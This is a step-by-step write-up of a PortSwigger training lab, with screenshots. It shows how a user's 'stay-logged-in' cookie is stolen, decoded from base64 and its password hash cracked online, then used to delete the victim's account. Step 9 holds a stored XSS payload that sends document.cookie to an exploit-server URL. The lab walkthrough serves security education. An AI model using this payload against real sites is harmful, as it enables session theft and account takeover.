---
title: Portswigger writeup - Offline Password Cracking
categories: [writeup,walkthrough,security]
tags: [writeup,walkthrough,portswigger,burp,login,security,password,offline]
---

<a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking" target="_blank">This lab</a> is in the same series than the previous article. The goal here to steal Carlos's "stay-logged-in" cookie to steal and delete his account. 

# **Lab: Offline password cracking**

1. Click “My account button”
    
    ![offline-password-cracking-1.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-1.png)
    
2. Enter Wiener’s credentials, click “stay-logged-in” option and click “Log in”
    
    ![offline-password-cracking- (2).png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-2.png)
    
3. In Proxy > HTTP History, click the the GET reset “/my-account” and click on the arrow on the “stay-logged-in” cookie
    
    ![offline-password-cracking-3.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-3.png)
    
4. The base64 string is decoded: `username:password`O 
    
    ![offline-password-cracking-4.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-4.png)
    
5. Click “Home”
    
    ![offline-password-cracking-5.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-5.png)
    
6. Click a “View post” button
    
    ![offline-password-cracking-6.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-6.png)
    
7. In another tab, open the Exploit Server
    
    ![offline-password-cracking-7.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-7.png)
    
8. Copy its URL
    
    ![offline-password-cracking-8.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-8.png)
    
9. On the post opened at step 6, bottom page, add the following payload (change the URL for your exploit server), as well as random name, email address and website URL. Then click “Post comment”: `<script>document.location='https://exploit-server-url.com'+document.cookie</script>`
    
    ![offline-password-cracking-9.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-9.png)
    
10. Click “Back to blog”
    
    ![offline-password-cracking-10.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-10.png)
    
11. The blog post will be redirected to a similar page (here on Firefox)
    
    ![offline-password-cracking-11).png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-11.png)
    
12. Go back the the exploit server and click “Access log”
    
    ![offline-password-cracking-12.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-12.png)
    
13. A GET reset “/exploitserver” appears in the list, containing a “stay-logged-in” cookie, copy its string
    
    ![offline-password-cracking-13.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-13.png)
    
14. Go to [base64decode.org](http://base64decode.org), paste the string previously copied to decode it and copy the hashed password, after “`carlos:`”
    
    ![offline-password-cracking-14.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-14.png)
    
15. Go to [crackstation.net](http://crackstation.net) and paste the hash to get Carlos’s password
    
    ![offline-password-cracking-15.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-15.png)
    
16. Go back to the lab’s tab and click multiple times on the “Go back” button until you can see the website without being redirected
    
    ![offline-password-cracking-16.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-16.png)
    
17. If needed, click “My account”, according to the point you have reached using the “Go back” button, and click “Log out”
    
    ![offline-password-cracking-17.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-17.png)
    
18. Click “My account” again
    
    ![offline-password-cracking-18.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-18.png)
    
19. Enter “carlos” as a username and the password previously found at step 16 on Crackstation, “onceuponatime”, and click “Log in”
    
    ![offline-password-cracking-19.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-19.png)
    
20. When you are on Carlos’s “My account” page, click “Delete account”
    
    ![offline-password-cracking-20.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-20.png)
    
21. Paste one more time his password as a confirmation and click “Delete account!”
    
    ![offline-password-cracking-21.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-21.png)
    
22. The lab is solved
    
    ![offline-password-cracking-22.png](/assets/images/2022-11-30-Password-reset-poisoning-via-middleware/2022-11-26-offline-password-cracking/offline-password-cracking-22.png)